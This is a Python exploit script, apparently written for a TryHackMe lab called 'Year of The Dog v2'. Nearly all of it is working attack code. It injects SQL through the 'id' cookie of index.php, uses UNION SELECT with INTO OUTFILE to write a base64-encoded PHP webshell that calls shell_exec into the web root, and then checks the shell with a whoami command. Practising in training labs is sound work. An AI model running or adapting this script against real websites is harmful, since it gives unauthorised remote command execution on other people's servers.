#!/usr/bin/env python3

'''
	developed by @b.strawberry for THM lab: Year of The Dog v2
	Usage: year_of_the_dog.py -u http://xxx.xxx.xxx.xx
'''

from requests import get
from base64 import b64encode
from random import randint
from hashlib import md5
from uuid import uuid4
from argparse import ArgumentParser
from sys import exit 

def inject_webshell(schema, target):
	user = None
	p1, p2 = "<?php echo".encode('utf-8'), "shell_exec($_GET['cmd']); ?>".encode('utf-8')
	s1, s2 = b64encode(p1).decode('utf-8'), b64encode(p2).decode('utf-8')
	cookie = md5(str(randint(0,99999)).encode('utf-8')).hexdigest()
	webshell = str(uuid4()).split('-')[0] + '.php'
	bad_cookie = f"{cookie}' union select from_base64('{s1}'),from_base64('{s2}')"
	bad_cookie = f"{bad_cookie} INTO OUTFILE '/var/www/html/{webshell}' -- MUHAHAA"
	bad_cookie = f"id={bad_cookie}"
	headers = {
		'Cookie': bad_cookie
	}
	base_url = f'{schema}://{target}'
	cookie_url  = f'{base_url}/index.php'
	shell_url  = f'{base_url}/{webshell}'
	print(f'[*] Injecting webshell at {shell_url}')
	try:
		get(cookie_url, headers=headers, verify=False)
	except:
		return None
	try:
		res = get(f"{shell_url}?cmd=whoami", verify=False)
	except:
		return None
	user = res.text.strip()
	if user is not None:
		print(f'[*] Success! We got a webshell as {user}\n')
	return shell_url


if __name__ == '__main__':
	webshell = None
	parser = ArgumentParser()
	parser.add_argument('-u', type=str, required=True)
	args = parser.parse_args()
	schema, target = args.u.split('/')[0].replace(':',''), args.u.split('/')[2]
	webshell = inject_webshell(schema, target)
	if webshell is None:
		print('[*] - Err: SQLi injection failed! is the target really vulnerable?')
		exit(1)
